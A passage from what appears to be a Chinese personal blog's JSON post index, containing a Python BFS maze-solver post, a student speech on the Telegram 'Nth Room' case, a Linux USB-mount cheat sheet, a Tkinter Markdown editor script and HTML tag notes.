&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;]]# set the routemap1[9][0]=&#x27;A&#x27;map1[0][9]=&#x27;B&#x27;for i in range(10): map1[5][i] = &#x27; &#x27;for i in range(10): map1[i][5] = &#x27; &#x27;map1[9][1] = &#x27; &#x27;map1[9][2] = &#x27; &#x27;map1[9][3] = &#x27; &#x27;map1[9][4] = &#x27; &#x27;map1[0][6] = &#x27; &#x27;map1[0][7] = &#x27; &#x27;map1[0][8] = &#x27; &#x27;# print out the mapfor i in map1: for j in i: print(j,end=&#x27; &#x27;) print(&quot;\\n&quot;)class Unit: def __init__(self,c,p): x=c[0] y=c[1] self.x=x self.y=y self.up=(self.x,self.y+1) self.down=(self.x,self.y-1) self.left=(self.x-1,self.y) self.right=(self.x+1,self.y) self.directions = [self.up,self.down,self.left,self.right] self.parent = pstart=Unit((9,0),(0,0))goal=Unit((0,9),(-1,-1))def travel(map1,start): frontier = [] explored = [] current = Unit((start.x,start.y),start.parent) frontier.append(current) while True: if len(frontier) == 0: print(&quot;No result&quot;) break del(frontier[0]) explored.append(Unit((current.x,current.y),current.parent)) if current.x == goal.x and current.y == goal.y: print(&quot;\\nGot it!\\n&quot;) while current.parent != (0,0): for trace in explored: if trace.x == current.parent[0] and trace.y == current.parent[1]: if map1[current.x][current.y] == &#x27; &#x27;: map1[current.x][current.y] = &#x27;.&#x27; # print(current.x,current.y) current = trace for i in map1: for j in i: print(j,end=&#x27; &#x27;) print(&quot;\\n&quot;) break for i in current.directions: j=Unit((i[0],i[1]),(current.x,current.y)) # print((j.x,j.y),end=&#x27;,&#x27;) condition = 1 for x in explored: if x.x==j.x and x.y==j.y: condition = 0 if condition and j.x&gt;=0 and j.x&lt;=9 and j.y&gt;=0 and j.y&lt;=9 and map1[j.x][j.y] != &#x27;#&#x27;: frontier.append(Unit((i[0],i[1]),(current.x,current.y))) current = frontier[0] travel(map1,start) 在实现的过程中，我遇到了一些问题： 由于对Python中类的使用不熟练，导致代码中有关部分看起来很奇怪 在遍历当前节点周围的有效节点时，没有重新初始化节点，而是直接将当前节点周围有效节点的坐标加入边界，导致循环从第二次开始就无法进行，因为坐标没有“周围的有效节点”这个属性 在将以探索过的节点加入对应数据结构后，检查下一个节点是否在此数据结构时直接使用“==”，但是即使坐标相同的两个节点也可能不相等，原因是这两个节点存在于不同的地址，正确的做法是再遍历一遍存储以探索过的数据结构，直接比较此数据结构中节点的坐标值 在完成初步的实现后，处于对代码重构的要求，对代码做了相关的函数封装： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107map1 = [[&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;], [&#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;, &#x27;#&#x27;]]# set the routemap1[9][0]=&#x27;A&#x27;map1[0][9]=&#x27;B&#x27;for i in range(10): map1[5][i] = &#x27; &#x27;for i in range(10): map1[i][5] = &#x27; &#x27;map1[9][1] = &#x27; &#x27;map1[9][2] = &#x27; &#x27;map1[9][3] = &#x27; &#x27;map1[9][4] = &#x27; &#x27;map1[0][6] = &#x27; &#x27;map1[0][7] = &#x27; &#x27;map1[0][8] = &#x27; &#x27;# print out the mapdef map_show(map1): for i in map1: for j in i: print(j,end=&#x27; &#x27;) print(&quot;\\n&quot;)map_show(map1)class Unit: def __init__(self,c,p): x=c[0] y=c[1] self.x=x self.y=y self.up=(self.x,self.y+1) self.down=(self.x,self.y-1) self.left=(self.x-1,self.y) self.right=(self.x+1,self.y) self.directions = [self.up,self.down,self.left,self.right] self.parent = pstart=Unit((9,0),(0,0))goal=Unit((0,9),(-1,-1))def route_trace(current,explored): while current.parent != (0,0): for trace in explored: if trace.x == current.parent[0] and trace.y == current.parent[1]: if map1[current.x][current.y] == &#x27; &#x27;: map1[current.x][current.y] = &#x27;.&#x27; # print(current.x,current.y) current = tracedef action(frontier,explored,current): for i in current.directions: j=Unit((i[0],i[1]),(current.x,current.y)) # print((j.x,j.y),end=&#x27;,&#x27;) condition = 1 for x in explored: if x.x==j.x and x.y==j.y: condition = 0 if condition and j.x&gt;=0 and j.x&lt;=9 and j.y&gt;=0 and j.y&lt;=9 and map1[j.x][j.y] != &#x27;#&#x27;: frontier.append(Unit((i[0],i[1]),(current.x,current.y)))def travel(map1,start): frontier = [] explored = [] current = Unit((start.x,start.y),start.parent) frontier.append(current) while True: if len(frontier) == 0: print(&quot;No result&quot;) break del(frontier[0]) explored.append(Unit((current.x,current.y),current.parent)) if current.x == goal.x and current.y == goal.y: print(&quot;\\nGot it!\\n&quot;) route_trace(current,explored) map_show(map1) break action(frontier,explored,current) if len(frontier) == 0: print(&quot;No result&quot;) break current = frontier[0] travel(map1,start) 结果如下： 123456789101112131415161718192021222324252627282930313233343536373839404142# # # # # B # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # A # # # # Got it!# # # # # . . . . B # # # # # . # # # # # # # # # . # # # # # # # # # . # # # # # # # # # . # # # # . # # # # # . # # # # # # # # # . # # # # # # # # # . # # # # A . . . . . # # # # 现在，这个程序已经能够找出各种迷宫地图的解法了，也就是说，如果我们对地图进行修改，程序也能够正常运行并输出相应结果，比如，我们将地图的唯一道路“封死”，那么结果就会是“No result”，如下所示： 123456789101112131415161718192021# # # # # B # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # A # # # # # No result 至此，我们就完成了对此情境下相关代码的编写。 修改于2021.04.11","categories":[],"tags":[{"name":"知识输出","slug":"知识输出","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"},{"name":"AI","slug":"AI","permalink":"http://uniqueland.top/tags/AI/"}]},{"title":"来自班级组织演讲的一篇演讲稿","slug":"Speech","date":"2021-04-09T16:46:04.297Z","updated":"2020-11-09T06:00:08.000Z","comments":true,"path":"2021/04/10/Speech/","link":"","permalink":"http://uniqueland.top/2021/04/10/Speech/","excerpt":"正文地狱空荡荡 恶魔在人间 想必在座各位多少看过这句话，这就是我今天要说的有关Telegram N号房事件的一些东西；由于案情复杂，我就不再赘述，有兴趣的请自行百度主要人物介绍：","text":"正文地狱空荡荡 恶魔在人间 想必在座各位多少看过这句话，这就是我今天要说的有关Telegram N号房事件的一些东西；由于案情复杂，我就不再赘述，有兴趣的请自行百度主要人物介绍：赵主彬：现年25岁，信息通信专业，曾担任学报编辑部编辑。多次获得奖学金。3年内参加了50多次志愿活动。就是这么一个表面人畜无害的优秀学生，主导了这么一起事件。对此人进行分析，我们不难得出：平台用telegram，交易用比特币，说明罪犯反侦查意识高，思维敏捷，可以归类为高智商信息犯罪；内心自卑，但是外围性格特征表现为自负，因无法达到自身的高度预期郁不得志，因此可能存在社会偏见，有一定概率发展为反社会型人格；可能存在家庭暴力，且是父权家庭；社交能力较差，排斥甚至仇视女性，这点可以从他在被捕后的言论发表矢口不谈对女性的道歉这一点可以看出。 有的孩子是孩子，有的孩子是禽兽这十几年都塞了什么进脑子里人名不打码，马赛克做错了什么 就像这些评论所表述的一样，我也痛恨这些精虫上脑的东西。但是几乎一边倒的网络舆论显然有些问题：这26万人个个都罪该万死吗？考虑到涉案人数及案件的复杂程度，我个人觉得其中还是不乏被教唆的，受蒙骗的，甚至不明情况的。不是说强行洗白，而是我认为每个人看待事情都应该有自己的看法，有那种不被舆论大势所动摇的那种看法。大家是否看过这样一个比喻：韩国目前在运营的出租车大概有26万辆，这意味着在韩国的大街上，遇到N号房会员就像遇到出租车一样频繁。不知各位对这个比喻有什么看法在我看来，这是一种下意识的情景描绘，旨在放大案件涉及的范围，而这种情景描绘于我来看除了放大恐慌之外没有任何用处，那他们这么做的目的何在呢？要我说要不就是公众号博人眼球，要不就涉及到黑公关带节奏，由于这是一个国家级的案件，比起背后大到令人无法想象的黑灰产业链，我还是更倾向于前者。 最后，引用了几句某些公众号的评价作为我对此事的看法，话很粗，但理不粗：作为一个成年人，要学会克制，不该馋的不要馋。我知道现在是春天，但只有野狗才不分场合、不分对象，时刻想着交配。何况，野狗也只在春秋两季才发情 补充由于班级组织的演讲限时3分钟，所以我不得不把原本一千多字的演讲稿删为800多字，也因此缺失了很多事件的细节及个人的观点。–2020.05.07","categories":[],"tags":[]},{"title":"Linux下利用命令行对U盘和电脑中的文件进行操作","slug":"Operations between flash disk and linux os","date":"2021-04-09T16:46:04.296Z","updated":"2020-11-10T03:52:41.832Z","comments":true,"path":"2021/04/10/Operations between flash disk and linux os/","link":"","permalink":"http://uniqueland.top/2021/04/10/Operations%20between%20flash%20disk%20and%20linux%20os/","excerpt":"","text":"123456fdisk -l #查看接入设备名称mount /dev/sda1 /mnt #挂载U盘ls /mnt #查看U盘文件cp file directory #复制指定文件file至指定目录directoryls /mnt #再次查看U盘文件umount /mnt #卸载U盘 标题（可选）提示：若操作中出现错误，请查看权限是否正确，或在每次操作前加’sudo’cp后的文件和路径需带路径(个人推荐绝对路径)","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"Markdown_Editor V1.0","slug":"Markdown_Editor V1.0","date":"2021-04-09T16:46:04.295Z","updated":"2020-11-10T02:56:29.631Z","comments":true,"path":"2021/04/10/Markdown_Editor V1.0/","link":"","permalink":"http://uniqueland.top/2021/04/10/Markdown_Editor%20V1.0/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556\\# -*- coding=utf-8 -*- import tkinterimport osfrom tkinter import filedialogwin_size=&#x27;450x550&#x27;win = tkinter.Tk()win.geometry(win_size)win.title(&#x27;Markdown Editor V1.0 (hexo only)&#x27;)def processandsave(): contents = &#x27;---\\ntitle:&#x27; + title.get(&#x27;0.0&#x27;,&#x27;end&#x27;) + &#x27;tags:&#x27; + tags.get(&#x27;0.0&#x27;,&#x27;end&#x27;) + &#x27;---\\n&#x27; + content.get(&#x27;0.0&#x27;,&#x27;end&#x27;) filename = filedialog.asksaveasfilename() if filename is not None: with open(file=filename,mode=&#x27;w&#x27;) as file: file.write(str(contents)) title.delete(&#x27;0.0&#x27;,&#x27;end&#x27;) tags.delete(&#x27;0.0&#x27;,&#x27;end&#x27;) content.delete(&#x27;0.0&#x27;,&#x27;end&#x27;)def add_bash(): add_content=add_bash_text.get(&#x27;0.0&#x27;,&#x27;end&#x27;) add_content=add_content.rstrip() changing_content=&#x27;```bash\\n&#x27;+add_content+&#x27;\\n```\\n&#x27; content.insert(&#x27;end&#x27;,changing_content) add_bash_text.delete(&#x27;0.0&#x27;,&#x27;end&#x27;)label1=tkinter.Label(text=&#x27;标题&#x27;,padx=10,pady=10)label1.grid(row=0,column=0)title=tkinter.Text(width=40,height=2)title.grid(row=0,column=1,columnspan=2)label2=tkinter.Label(text=&#x27;标签&#x27;,padx=5,pady=5)label2.grid(row=1,column=0)tags=tkinter.Text(width=30,height=1)tags.grid(row=1,column=1)label3=tkinter.Label(text=&#x27;正文&#x27;,padx=5,pady=5)label3.grid(row=2,column=0)content=tkinter.Text(width=40,height=20)content.grid(row=2,column=1,rowspan=5)add_bash_button=tkinter.Button(win,text=&#x27;命令行&#x27;,command=add_bash)add_bash_button.grid(row=9,column=0)add_bash_text=tkinter.Text(width=40,height=5)add_bash_text.grid(row=9,column=1)save_button=tkinter.Button(win,text=&#x27;保存&#x27;,command=processandsave)save_button.grid(row=8,column=1)win.mainloop()","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"Thanksgiving","slug":"img_share","date":"2021-04-09T16:46:04.294Z","updated":"2020-11-28T16:15:08.320Z","comments":true,"path":"2021/04/10/img_share/","link":"","permalink":"http://uniqueland.top/2021/04/10/img_share/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"HTML笔记","slug":"HTML_notes","date":"2021-04-09T16:46:04.293Z","updated":"2021-01-18T15:02:48.534Z","comments":true,"path":"2021/04/10/HTML_notes/","link":"","permalink":"http://uniqueland.top/2021/04/10/HTML_notes/","excerpt":"","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980811 &lt;h1&gt; to &lt;/h6&gt;: 一到六号标题2 &lt;p&gt;段落&lt;/p&gt;3 &lt;body style=&quot;background-color:PowderBlue;&quot;&gt; &lt;p style=&quot;font-family:verdana;color:red&quot;&gt;对段落样式进行修改&lt;/p&gt; &lt;/body&gt;4 &lt;br /&gt;&lt;hr /&gt;&lt;!这是注释，前面的是换行和分割线&gt;5 &lt;b&gt;被加粗的内容&lt;/b&gt;6 &lt;strong&gt;被...加粗的内容...吧&lt;/strong&gt;7 &lt;big&gt;被加大的内容&lt;/big&gt;8 &lt;em&gt;被强调(加斜)的内容&lt;/em&gt;9 &lt;i&gt;被...意大利式加斜的内容&lt;/i&gt;10 &lt;small&gt;被减小的内容&lt;/small&gt;11 &lt;sub&gt;位于右下角的小字部分&lt;/sub&gt;12 &lt;sup&gt;位于右上角的小字部分&lt;/sup&gt;13 &lt;pre&gt;预格式文本(保留了空格和换行)&lt;/pre&gt;14 &lt;code&gt;用于&lt;/code&gt;,&lt;kbd&gt;显示&lt;/kbd&gt;,&lt;samp&gt;代码&lt;/samp&gt;,&lt;var&gt;这个加大加粗了一点&lt;/var&gt;15 &lt;address&gt;用于书写地址，其中记得手动添加换行标签&lt;/address&gt;16 &lt;abbr title=&quot;etcetera&quot;&gt;etc.&lt;/abbr&gt;17 &lt;acronym title=&quot;World Wide Web&quot;&gt;WWW&lt;/acronym&gt;18 &lt;bdo dir=&quot;rtl&quot;&gt;印打序倒&lt;/bdo&gt;19 &lt;blockquote&gt;块引用&lt;/blockquote&gt;,&lt;q&gt;短引用&lt;/q&gt;20 &lt;p&gt;你看&lt;del&gt;我被划掉了&lt;/del&gt;&lt;ins&gt;又被加下划线了&lt;/ins&gt;&lt;/p&gt;21 &lt;a name=&quot;tips&quot;&gt;基本的注意事项 - 有用的提示&lt;/a&gt; &lt;a href=&quot;#tips&quot;&gt;有用的提示&lt;/a&gt;22 &lt;img src=&quot;url&quot; width=xx height=xx align=xxx /&gt;23 &lt;table border=&quot;1&quot;&gt; &lt;tr&gt; &lt;th&gt;Heading&lt;/th&gt; &lt;th&gt;Another Heading&lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;row 1, cell 1&lt;/td&gt; &lt;td&gt;row 1, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;row 2, cell 1&lt;/td&gt; &lt;td&gt;row 2, cell 2&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;24 &lt;ul&gt;&lt;!unsorted list&gt; &lt;li&gt;Coffee&lt;/li&gt; &lt;li&gt;Milk&lt;/li&gt; &lt;/ul&gt;25 &lt;ol&gt;&lt;!ordered list&gt; &lt;li&gt;Coffee&lt;/li&gt; &lt;li&gt;Milk&lt;/li&gt; &lt;/ol&gt;26 &lt;dl&gt;&lt;!defined list&gt; &lt;dt&gt;Coffee&lt;/dt&gt; &lt;dd&gt;Black hot drink&lt;/dd&gt; &lt;dt&gt;Milk&lt;/dt&gt; &lt;dd&gt;White cold drink&lt;/dd&gt; &lt;/dl&gt;27 &lt;head&gt; &lt;style&gt; .cities &#123; background-color:black; color:white; margin:20px; padding:20px; &#125; &lt;/style&gt; &lt;/head&gt;28 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;style&gt; span.red &#123;color:red;&#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;My &lt;span class=&quot;red&quot;&gt;Important&lt;/span&gt; Heading&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt;29 &lt;iframe src=&quot;demo_iframe.htm&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;/iframe&gt;30 &lt;body background=&quot;http://www.w3school.com.cn/clouds.gif&quot;&gt;31 &lt;script type=&quot;text/javascript&quot;&gt; document.write(&quot;Hello World!&quot;) &lt;/script&gt; &lt;noscript&gt;Your browser does not support JavaScript!&lt;/noscript&gt; Quick Search","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"}]},{"title":"0","slug":"0","date":"2020-03-22T09:06:28.000Z","updated":"2020-11-09T06:00:08.000Z","comments":true,"path":"2020/03/22/0/","link":"","permalink":"http://uniqueland.top/2020/03/22/0/","excerpt":"","text":"Hello,World！说人话 我终于有自己的网站啦 虽然只是部署在github上的先做个测试 下回在看看要弄啥peach..啊不…peace～～","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://uniqueland.top/tags/ctf/"},{"name":"Internet","slug":"Internet","permalink":"http://uniqueland.top/tags/Internet/"},{"name":"web","slug":"web","permalink":"http://uniqueland.top/tags/web/"},{"name":"tool","slug":"tool","permalink":"http://uniqueland.top/tags/tool/"},{"name":"知识输出、AI","slug":"知识输出、AI","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA%E3%80%81AI/"},{"name":"linux","slug":"linux","permalink":"http://uniqueland.top/tags/linux/"},{"name":"other","slug":"other","permalink":"http://uniqueland.top/tags/other/"},{"name":"ctf、web","slug":"ctf、web","permalink":"http://uniqueland.top/tags/ctf%E3%80%81web/"},{"name":"CTF","slug":"CTF","permalink":"http://uniqueland.top/tags/CTF/"},{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"知识输出","slug":"知识输出","permalink":"http://uniqueland.top/tags/%E7%9F%A5%E8%AF%86%E8%BE%93%E5%87%BA/"},{"name":"AI","slug":"AI","permalink":"http://uniqueland.top/tags/AI/"}]}